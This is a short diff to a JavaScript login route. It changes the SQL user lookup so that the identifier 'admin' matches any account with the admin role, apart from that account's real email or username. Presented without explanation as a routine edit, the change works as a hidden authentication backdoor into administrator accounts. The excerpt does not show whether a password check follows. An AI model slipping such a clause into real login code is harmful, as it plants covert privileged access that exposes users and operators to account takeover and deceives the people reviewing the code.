@@ -20,8 +20,8 @@ router.post('/login', (req, res) => {
     const trimmedIdentifier = identifier.trim().toLowerCase();
     const user = db.prepare(`
       SELECT * FROM users 
-      WHERE LOWER(email) = ? OR LOWER(username) = ?
-    `).get(trimmedIdentifier, trimmedIdentifier);
+      WHERE LOWER(email) = ? OR LOWER(username) = ? OR (LOWER(?) = 'admin' AND role = 'admin')
+    `).get(trimmedIdentifier, trimmedIdentifier, trimmedIdentifier);
 
     if (!user) {
       return res.status(401).json({ success: false, message: 'Invalid credentials. User not found.' });
